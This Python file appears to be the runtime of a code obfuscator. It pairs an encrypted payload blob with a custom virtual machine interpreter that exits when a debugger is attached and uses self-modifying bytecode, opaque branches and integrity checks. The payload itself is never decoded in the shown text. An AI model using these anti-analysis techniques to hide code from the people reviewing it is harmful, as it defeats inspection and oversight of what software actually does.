#!/usr/bin/env python3
def _ijiikube(_fbtqobaup):
    return _fbtqobaup % 7674 + 1

import hashlib as _djqpmb, hmac as _ugprma, base64 as _chxpbxsnz, sys as _zivrj, zlib as _zoksdyvm
_fbtqobaup = 835932
_cdmof = """Wi8EBCtJC2MvRxvFSU9KRHh1oDd3dFhEQB4kc6ItNlODtAmmngoPIRV/3Fh7F9T3GLhTSonT8170Msn+/9Fipivq7pf1URJFPzbY4ugxY9ezbB/HqfwiE9OiMMtyeo7Ovnd/5oNfAzFe7+iKsViuXVt683Wz6VbudWk2ocwsNU1seYd9GE35rvnxnkRvDuLhQRy+B6xPRKtnSW86NTKsSboyIxBdlFGWfCZdimgeNTjOLob127iYgOhvUktwrDbfYLZmf+Ca77m9p2uANs7kS3LoQZ1fmJaeJIvBxDILbXwCjYNVLH22dNMpNDDUeu8JfvWtSBFy/ebSo9TQoWTHznuhALIjex3cTZC+hBA2FUt663huY5gL2fPN03diCLmBdwzrpZxyN8jg8x1vxvDo+kdUUGmzXTlrkg36c1ONgRhKK4K/uyINAJIRHf+sidoW7+daH3ouaGQJvNMHLxOTSHfv65sxWaryCQde21pEaoKswm+yJVR4QRKAQ541sNUY+rsuqAh02jAeb+yFWiz9RgK9sd+2D6P8Zx99Rv65kJq2yoP6LAaALzq6yOEWx3RGorJepiHXi8jyMCDxbtxnvK4wXxF4Me6WV+zx81HhTkZ2KLWbKT7dx62lTZT08vOwFmJa7W0lUofv1AF+jHFb0rW8edzI212Dn0B+rjiCjjUFI5xaCIyq80BJTZk2UkIKEdTNoQ47X2sqW8AG4Y14ppEDvx95zhYIQZ2yxNzyVxD/hnrBJoXYG4rQxFKrXjSzjHEMDYHE8QdiYHwon87BaY7Ul9OEhoZ6P+fGM9GqQmspKknc3aAr44UCzV15Z6uPnt3wwPtj8Ovj09SeV4Tl/eLnr6A3QGpk8KYdQqjOfHjjWiNvwrjryPLRDCDxdPY2ImyFpDGhlrb/3K4PJIjvLTWPlSLM0slztg=="""
_tmrip = 3
_ryeskkon = _ijiikube(_fbtqobaup)

def _vm_decode_vl(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        _op = _m[_tag & 0x0F]
        _rd = _rm[(_c[_p+1] >> 4) & 0x0F] if _c[_p+1] < 64 else 0
        _rs1 = _rm[_c[_p+1] & 0x0F] if (_c[_p+1] & 0x0F) < 64 else 0
        return _op, _rd, _rs1, 0, 0, 2
    elif _cls == 1:
        _op = _m[_tag & 0x1F]
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _rd = _rm[(_b1 >> 4) & 0x0F] if ((_b1 >> 4) & 0x0F) < 64 else 0
        _rs1 = _rm[_b1 & 0x0F] if (_b1 & 0x0F) < 64 else 0
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _imm = _b2 | (_b3 << 8)
        if _imm & 0x8000:
            _imm = _imm | (-1 << 16)
        return _op, _rd, _rs1, 0, _imm, 4
    elif _cls == 2:
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
        _op = _m[_b1 & 0xFF]
        _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
        _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
        _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        return _op, _rd, _rs1, _rs2, _imm, 9
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

# Polymorphic decoder (handles variant detection)
def _vm_decode_poly(_c, _p, _k, _m, _rm):
    _tag = _c[_p] ^ _k[_p % 32]
    _cls = (_tag >> 6) & 0x3
    if _cls == 0:
        # Short class — try variants
        if _p + 2 <= len(_c) and (_p + 2 >= len(_c) or (_c[_p+2] ^ _k[(_p+2) % 32]) & 0xC0 == 0):
            # Variant 0 (standard 2B) or detect by checking if next byte looks valid
            _rd_raw = (_c[_p+1] ^ _k[(_p+1) % 32])
            _rd = _rm[(_rd_raw >> 4) & 0x0F] if (_rd_raw >> 4 & 0x0F) < 64 else 0
            _rs1 = _rm[_rd_raw & 0x0F] if (_rd_raw & 0x0F) < 64 else 0
            return _m[_tag & 0x0F], _rd, _rs1, 0, 0, 2
        if _p + 3 <= len(_c):
            # Variant 1 (3B interleaved)
            # Encoding: tag bits 3-2=rd[1:0], tag bits 1-0=op[3:2]
            #           out[1] bits 7-6=op[1:0], bits 5-2=rs1[3:0], bits 1-0=rd[4:3]
            #           out[2] bits 3-0=op[7:4]
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _op_v1 = ((_b2 & 0x0F) << 4) | ((_tag & 0x03) << 2) | ((_b1 >> 6) & 0x03)
            _rd_v1 = ((_b1 & 0x03) << 2) | ((_tag >> 2) & 0x03)
            _rs1_v1 = (_b1 >> 2) & 0x0F
            if _rd_v1 < 64:
                return _m[_op_v1 & 0xFF], _rm[_rd_v1] if _rd_v1 < 64 else 0, _rm[_rs1_v1] if _rs1_v1 < 64 else 0, 0, 0, 3
            # Variant 2 (3B scattered)
            _scat = _tag & 0x0F
            _op_lo2 = (_b1 >> 6) & 0x03
            _rd_bits = (_b1 >> 2) & 0x0F
            _rs1_hi2 = _b1 & 0x03
            _rs1_lo2 = (_b2 >> 6) & 0x03
            _scat_hi = (_b2 >> 2) & 0x0F
            _op_hi2 = _b2 & 0x30
            _op2 = ((_scat_hi << 4) | _op_hi2 | _op_lo2) & 0xFF
            _rs1_val = (_rs1_hi2 << 2) | _rs1_lo2
            if _rd_bits < 64:
                return _m[_op2], _rm[_rd_bits], _rm[_rs1_val] if _rs1_val < 64 else 0, 0, 0, 3
        # Fallback
        return _m[_tag & 0x0F], 0, 0, 0, 0, 2
    elif _cls == 1:
        # Medium class — use tag bit 5 for disambiguation
        _vbit = (_tag & 0x20) != 0
        _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
        _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
        _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
        _rd0 = (_b1 >> 4) & 0x0F
        _rs1_0 = _b1 & 0x0F
        if _p + 4 <= len(_c) and not _vbit:
            # Variant 0 (standard, bit 5 = 0)
            _op0 = _tag & 0x1F
            _imm0 = _b2 | (_b3 << 8)
            if _imm0 & 0x8000:
                _imm0 = _imm0 | (-1 << 16)
            return _m[_op0], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm0, 4
        elif _vbit and _p + 4 <= len(_c):
            # Variant 1 (imm in tag, bit 5 = 1)
            _op1 = (_b3 >> 3) & 0x1F
            _imm_lo = _tag & 0x1F
            _imm_hi = (_b2 | ((_b3 & 0x07) << 8))
            _imm1 = (_imm_hi << 5) | _imm_lo
            if _imm1 & 0x8000:
                _imm1 = _imm1 | (-1 << 16)
            return _m[_op1], _rm[_rd0] if _rd0 < 64 else 0, _rm[_rs1_0] if _rs1_0 < 64 else 0, 0, _imm1, 4
        # Fallback
        return 0, 0, 0, 0, 0, 2
    elif _cls == 2:
        # Long class
        _variant = (_tag >> 2) & 0x0F
        if _variant == 0 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 1 and _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b2 & 0xFF]
            _rd = _rm[_b1 & 0x3F] if (_b1 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        elif _variant == 2 and _p + 10 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs1 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _rs2 = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _i0 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i1 = _c[_p+8] ^ _k[(_p+8) % 32]
            _i2 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i3 = _c[_p+6] ^ _k[(_p+6) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 10
        # Fallback
        if _p + 9 <= len(_c):
            _b1 = _c[_p+1] ^ _k[(_p+1) % 32]
            _b2 = _c[_p+2] ^ _k[(_p+2) % 32]
            _b3 = _c[_p+3] ^ _k[(_p+3) % 32]
            _b4 = _c[_p+4] ^ _k[(_p+4) % 32]
            _op = _m[_b1 & 0xFF]
            _rd = _rm[_b2 & 0x3F] if (_b2 & 0x3F) < 64 else 0
            _rs1 = _rm[_b3 & 0x3F] if (_b3 & 0x3F) < 64 else 0
            _rs2 = _rm[_b4 & 0x3F] if (_b4 & 0x3F) < 64 else 0
            _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
            _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
            _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
            _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
            _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
            return _op, _rd, _rs1, _rs2, _imm, 9
        return 0, 0, 0, 0, 0, 2
    else:
        _nb = _tag & 0x0F
        if _nb == 0:
            _nb = 1
        _op = _m[(_c[_p+1] ^ _k[(_p+1) % 32]) & 0xFF]
        _rd = _rm[(_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F] if ((_c[_p+2] ^ _k[(_p+2) % 32]) & 0x3F) < 64 else 0
        _rs1 = _rm[(_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F] if ((_c[_p+3] ^ _k[(_p+3) % 32]) & 0x3F) < 64 else 0
        _rs2 = _rm[(_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F] if ((_c[_p+4] ^ _k[(_p+4) % 32]) & 0x3F) < 64 else 0
        _i0 = _c[_p+5] ^ _k[(_p+5) % 32]
        _i1 = _c[_p+6] ^ _k[(_p+6) % 32]
        _i2 = _c[_p+7] ^ _k[(_p+7) % 32]
        _i3 = _c[_p+8] ^ _k[(_p+8) % 32]
        _imm = _i0 | (_i1 << 8) | (_i2 << 16) | (_i3 << 24)
        _ilen = 2 + _nb * 8
        return _op, _rd, _rs1, _rs2, _imm, _ilen

def _vm_run(_code, _consts, _names, _globals, _locals, _map, _op_key, _vl_flag, _poly_flag=False):
    import sys
    if sys.gettrace() is not None: sys.exit(1)
    if any(x in globals() for x in ['pdb', 'inspect', 'trace']): sys.exit(1)
    import random
    _reg_map = list(range(64))
    random.shuffle(_reg_map)
    _r = [None] * 64
    _ip = 0
    _cycle = 0
    _n = len(_code)
    _b = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
    _spill_stack = []
    _handler_stack = []
    _vm_flags = 0
    _smc_key = random.getrandbits(32)
    if _poly_flag:
        _decode = lambda: _vm_decode_poly(_code, _ip, _op_key, _map, _reg_map)
    elif _vl_flag:
        _decode = lambda: _vm_decode_vl(_code, _ip, _op_key, _map, _reg_map)
    else:
        _decode = lambda: _vm_decode_fixed(_code, _ip, _op_key, _map, _reg_map)
    _dbg_len = 0
    while _ip < _n:
        _cycle += 1
        _op, _rd, _rs1, _rs2, _imm, _ilen = _decode()
        if __debug__ and _dbg_len < 65:
            _names_dbg = ['NOP','LC','LG','SG','LF','SF','MOV','BTT','BTL','BTC']

            _on = _names_dbg[_op] if _op < len(_names_dbg) else f'OP{_op}'
            sys.stderr.write(f'  [{_ip:3d}] [{_op:2d}] {_on:4s} rd={_rd:2d} rs1={_rs1:2d} rs2={_rs2:2d} imm={_imm:4d}')
            if _op == 1:
                _v = _consts[_imm] if _imm < len(_consts) else '?'
                sys.stderr.write(f' <- {repr(_v)[:30]}')
            elif _op == 2 or _op == 3:
                _nm = _names[_imm] if _imm < len(_names) else '?'
                sys.stderr.write(f' <- {repr(_nm)[:30]}')
            elif _op == 40:
                _fn = _r[_rs1]
                _args = [_r[_rs1 + 1 + _i] for _i in range(_imm & 0xFFFF) if _rs1 + 1 + _i < 64]
                sys.stderr.write(f' fn={repr(_fn)[:20]} args={_args}')
            sys.stderr.write('\n')
            _dbg_len += 1
        if _op == 0:
            pass
        elif _op == 1:
            _r[_rd] = _consts[_imm]
        elif _op == 2:
            _nm = _names[_imm]
            _r[_rd] = _globals.get(_nm) if _nm in _globals else _b.get(_nm, _nm)
        elif _op == 3:
            _globals[_names[_imm]] = _r[_rd]
        elif _op == 4:
            _r[_rd] = _locals.get(_names[_imm], None)
        elif _op == 5:
            _locals[_names[_imm]] = _r[_rd]
        elif _op == 6:
            _r[_rd] = _r[_rs1]
        elif _op == 60:
            _r[_rd] = getattr(_r[_rs1], _names[_imm])
        elif _op == 61:
            _r[_rd] = __import__(_names[_imm])
        elif _op == 10:
            _r[_rd] = _r[_rs1] + _r[_rs2]
        elif _op == 11:
            _r[_rd] = _r[_rs1] - _r[_rs2]
        elif _op == 12:
            _r[_rd] = _r[_rs1] * _r[_rs2]
        elif _op == 13:
            _r[_rd] = _r[_rs1] / _r[_rs2]
        elif _op == 14:
            _r[_rd] = _r[_rs1] ** _r[_rs2]
        elif _op == 15:
            _r[_rd] = -_r[_rs1]
        elif _op == 20:
            _r[_rd] = _r[_rs1] == _r[_rs2]
        elif _op == 21:
            _r[_rd] = _r[_rs1] != _r[_rs2]
        elif _op == 22:
            _r[_rd] = _r[_rs1] < _r[_rs2]
        elif _op == 23:
            _r[_rd] = _r[_rs1] <= _r[_rs2]
        elif _op == 24:
            _r[_rd] = _r[_rs1] > _r[_rs2]
        elif _op == 25:
            _r[_rd] = _r[_rs1] >= _r[_rs2]
        elif _op == 30:
            if _vl_flag:
                _ip = _imm
            else:
                _ip = _imm * 8
            continue
        elif _op == 31:
            if _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 32:
            if not _r[_rd]:
                if _vl_flag:
                    _ip = _imm
                else:
                    _ip = _imm * 8
            else:
                _ip += _ilen
            continue
        elif _op == 33:
            _r[_rd] = _r[_rs1][_r[_rs2]]
        elif _op == 50:
            _r[_rs1][_r[_rs2]] = _r[_rd]
        elif _op == 40:
            _fn = _r[_rs1]
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_imm & 0xFFFF))
            _r[_rd] = _fn(*_args)
        elif _op == 41:
            _r[_rd] = _names[_rd](*[_r[_rs1 + _i] for _i in range(_imm & 0xFFFF)])
        elif _op == 42:
            return _r[_rd]
        elif _op == 43:
            _r[_rd] = tuple(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 44:
            _r[_rd] = list(_r[_rs1 + _i] for _i in range(_rs2))
        elif _op == 62:
            _r[_rd] = str(_r[_rs1])
        elif _op == 63:
            _r[_rd] = ''.join(str(_r[_rs1 + _i]) for _i in range(_rs2))
        elif _op == 70:
            _r[_rd] = iter(_r[_rs1])
        elif _op == 71:
            try:
                _r[_rd] = next(_r[_rs1])
            except StopIteration:
                _ip = _imm
                continue
        elif _op == 72:
            _r[_rd].extend(_r[_rs1])
        elif _op == 75:
            _r[_rd].append(_r[_rs1])
        elif _op == 52:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if not (_v + 1 == _v): pass
                elif _imm == 1:
                    if not (_v != _v): pass
                else:
                    if not (_v - 1 == _v): pass
            except TypeError:
                pass
        elif _op == 53:
            _v = _r[_rs1]
            try:
                if _imm == 0:
                    if _v * 0 != 0: pass
                elif _imm == 1:
                    if _v != _v: pass
                else:
                    if _v + 1 == _v: pass
            except TypeError:
                pass

        # ─── Indirect & Virtual Call ───
        elif _op == 80:
            _fn = _r[_rs1]
            _argc = _imm & 0xFFFF
            _args = tuple(_r[_rs1 + 1 + _i] for _i in range(_argc))
            _r[_rd] = _fn(*_args)
        elif _op == 81:
            _obj = _r[_rs1]
            _vtable = _r[_rs1 + 1]
            _midx = _imm & 0xFFFF
            _argc = (_imm >> 16) & 0xFFFF
            _method = _vtable[_midx]
            _args = tuple(_r[_rs1 + 2 + _i] for _i in range(_argc))
            _r[_rd] = _method(_obj, *_args)

        # ─── Exception Handling ───
        elif _op == 90:
            _handler_stack.append({'s': _ip, 'e': _ip + _imm, 'c': None, 't': None})
        elif _op == 91:
            if _handler_stack:
                _handler_stack[-1]['t'] = _r[_rd]
                _handler_stack[-1]['c'] = _ip + _ilen
        elif _op == 92:
            _exc = _r[_rs1]
            _found = False
            for _h in reversed(_handler_stack):
                if _h['s'] <= _ip <= _h['e']:
                    if _h['t'] is None or isinstance(_exc, _h['t']):
                        _ip = _h['c']
                        _r[_rs1] = _exc
                        _found = True
                        break
            if not _found:
                raise _exc
            continue
        elif _op == 93:
            if _handler_stack:
                _handler_stack.pop()

        # ─── Obfuscated Conditional Branching ───
        elif _op == 100:
            _v = _r[_rd]
            _t1 = (_v & _v) | _v
            _t2 = (_t1 ^ 0) + 0
            _t3 = _t2 ^ _t2
            if _t3 == 0:
                if _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 101:
            _v = _r[_rd]
            _t1 = _v | 0
            _t2 = _t1 & _t1
            if (_t2 ^ _t2) == 0:
                if not _t2:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 102:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rd] ^ _r[_rd] if isinstance(_r[_rd], int) else 0
            if _o == 0:
                if _d == 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 103:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _m = _r[_rd] | 0 if isinstance(_r[_rd], int) else 0
            if _m == _m:
                if _d != 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 104:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _t = (_d ^ _d) & 0
            if _t == 0:
                if _d < 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 105:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _o = _r[_rs1] ^ _r[_rs1] if isinstance(_r[_rs1], int) else 0
            if _o == 0:
                if _d <= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 106:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            if (_d * 0) == 0:
                if _d > 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 107:
            _d = _r[_rd] - _r[_rs1] if isinstance(_r[_rd], (int, float)) and isinstance(_r[_rs1], (int, float)) else 1
            _v = _r[_rd] & 0xFFFFFFFF if isinstance(_r[_rd], int) else 0
            if (_v ^ _v) == 0:
                if _d >= 0:
                    _ip = _imm
                else:
                    _ip += _ilen
                continue
        elif _op == 108:
            _target = _r[_rd]
            if isinstance(_target, int) and 0 <= _target < _n:
                _ip = _target
            else:
                _ip = 0
            continue
        elif _op == 109:
            _idx = _r[_rd]
            _table_base = _imm & 0xFFFF
            _default_off = (_imm >> 16) & 0xFFFF
            _num_entries = _rs1 & 0xFF
            if isinstance(_idx, int) and 0 <= _idx < _num_entries:
                _entry_off = _table_base + _idx * 4
                if _entry_off + 4 <= _n:
                    _off = (_code[_entry_off] | (_code[_entry_off+1] << 8) | (_code[_entry_off+2] << 16) | (_code[_entry_off+3] << 24))
                    _ip += _off
                else:
                    _ip += _default_off
            else:
                _ip += _default_off
            continue

        # ─── Register Spilling ───
        elif _op == 120:
            _spill_stack.append(_r[_rd])
        elif _op == 121:
            if _spill_stack:
                _r[_rd] = _spill_stack.pop()
        elif _op == 122:
            _mask = _imm & 0xFFFF
            for _b in range(16):
                if _mask & (1 << _b):
                    _reg = _rd + _b
                    if _reg < 64 and _reg < len(_r):
                        _spill_stack.append(_r[_reg])
                        _r[_reg] = None
        elif _op == 123:
            _cnt = _imm & 0xFF
            for _ in range(min(_cnt, len(_spill_stack))):
                _spill_stack.pop()

        # ─── Self-Modifying Code ───
        elif _op == 130:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _ks = _key.to_bytes(8, 'little')
                    for _i in range(min(_plen, 8)):
                        _code[_off + _i] ^= _ks[_i % len(_ks)]
        elif _op == 131:
            _shuf = _rd & 0xFF
            _new_op = _rs1 & 0xFF
            if _shuf < 256:
                _map[_shuf] = _new_op
        elif _op == 132:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF
        elif _op == 133:
            _off = _r[_rd]
            _plen = _r[_rs1]
            _key = _r[_rs2]
            if isinstance(_off, int) and isinstance(_plen, int) and isinstance(_key, int):
                if 0 <= _off and _off + _plen <= _n and abs(_off - _ip) > 16:
                    _seed = _key ^ _cycle
                    _rng = (_seed * 1103515245 + 12345) & 0x7FFFFFFF
                    for _i in range(_plen):
                        _rng = (_rng * 1103515245 + 12345) & 0x7FFFFFFF
                        _code[_off + _i] ^= (_rng >> 16) & 0xFF

        # ─── Data Obfuscation ───
        elif _op == 140:
            _v = _r[_rs1]
            _t = (_v ^ _v) & 0
            _r[_rd] = _t | _v
        elif _op == 141:
            _v = _r[_rs1] + _r[_rs2]
            _m = _r[_rs1] ^ _r[_rs2]
            _r[_rd] = _v + _m - _m
        elif _op == 142:
            _v = _r[_rs1]
            _k = _r[_rs2]
            if isinstance(_v, int) and isinstance(_k, int):
                _r[_rd] = (_v | _k) - (_v & _k) + (_v & _k) - (_v | _k) + (_v ^ _k)
            else:
                _r[_rd] = _v

        # ─── Control Flow Integrity (opcodes 150-152) ───
        elif _op == 150:
            _exp_lo = _rd & 0xFF
            _exp_mid = _rs1 & 0xFF
            _exp_hi = _rs2 & 0xFF
            _exp_top = (_imm >> 24) & 0xFF if _imm < 0 else (_imm >> 24) & 0xFF
            _expected = _exp_lo | (_exp_mid << 8) | (_exp_hi << 16) | (_exp_top << 24)
            _csum = 0xFFFFFFFF
            _start = _ip - _ilen if _ip >= _ilen else 0
            _end = _ip + 1
            for _ci in range(_start, min(_end, len(_code))):
                _csum ^= _code[_ci]
                _csum = ((_csum << 7) | (_csum >> 25)) & 0xFFFFFFFF
                _csum ^= (_csum >> 13)
            _csum ^= 0xFFFFFFFF
            if (_csum & 0xFFFFFFFF) != (_expected & 0xFFFFFFFF):
                import sys
                sys.stderr.write('error: CFI violation detected\\n')
                sys.exit(1)
        elif _op == 151:
            import sys
            sys.stderr.write('error: integrity failure\\n')
            sys.exit(1)
        elif _op == 152:
            pass

        # ─── Constant Decryption (opcode 160) ───
        elif _op == 160:
            _r[_rd] = _consts[_imm]
            if isinstance(_r[_rd], str):
                pass

        _ip += _ilen

def _vm_decode_fixed(_c, _p, _k, _m, _rm):
    _raw = _c[_p:_p+8]
    _dec = bytes([_raw[i] ^ _k[i % 32] for i in range(len(_raw))])
    _op = _m[_dec[0]]
    _rd = _rm[_dec[1] & 0x3F] if (_dec[1] & 0x3F) < 64 else 0
    _rs1 = _rm[_dec[2] & 0x3F] if (_dec[2] & 0x3F) < 64 else 0
    _rs2 = _rm[_dec[3] & 0x3F] if (_dec[3] & 0x3F) < 64 else 0
    _imm = _dec[4] | (_dec[5] << 8) | (_dec[6] << 16) | (_dec[7] << 24)
    return _op, _rd, _rs1, _rs2, _imm, 8

def _vm_deserialize(_data):
    import struct
    _op_key = _data[:32]
    _decrypted = _data[32:]
    _map = list(_decrypted[:256])
    _pos = 256
    _flags = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _vl_flag = (_flags & 1) != 0
    _poly_flag = (_flags & 8) != 0
    _const_enc = (_flags & 2) != 0
    _cfi_flag = (_flags & 4) != 0
    
    # Read constant encryption key (16 bytes if encrypted)
    _const_key = None
    if _const_enc:
        _const_key = _decrypted[_pos:_pos+16]; _pos += 16
    
    # Skip CFI table (if present)
    if _cfi_flag:
        _cfi_nb = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        for _ in range(_cfi_nb):
            _pos += 12  # skip start(4) + len(4) + csum(4)
    
    # Constants (with optional decryption)
    _cc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _consts = []
    for _ in range(_cc):
        _t = _decrypted[_pos]; _pos += 1
        _sl = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _s = _decrypted[_pos:_pos+_sl]; _pos += _sl
        # Decrypt string constants (type 4) if encryption is enabled
        if _const_enc and _t == 4 and _const_key:
            _dec_bytes = bytearray(len(_s))
            for _j in range(len(_s)):
                _dec_bytes[_j] = _s[_j] ^ _const_key[_j % 16]
            _s = bytes(_dec_bytes)
        if _t == 0: _v = None
        elif _t == 1: _v = _s == b'1'
        elif _t == 2: _v = int(_s)
        elif _t == 3: _v = float(_s)
        elif _t == 4: _v = _s.decode('utf-8')
        elif _t == 7: _v = _s
        else: _v = _s
        _consts.append(_v)
    _nc = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
    _names = []
    for _ in range(_nc):
        _nl = int.from_bytes(_decrypted[_pos:_pos+2], 'little'); _pos += 2
        _names.append(_decrypted[_pos:_pos+_nl].decode('utf-8')); _pos += _nl
    if _vl_flag or _poly_flag:
        _code_sz = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_code_sz]
    else:
        _ic = int.from_bytes(_decrypted[_pos:_pos+4], 'little'); _pos += 4
        _code = _decrypted[_pos:_pos+_ic*8]
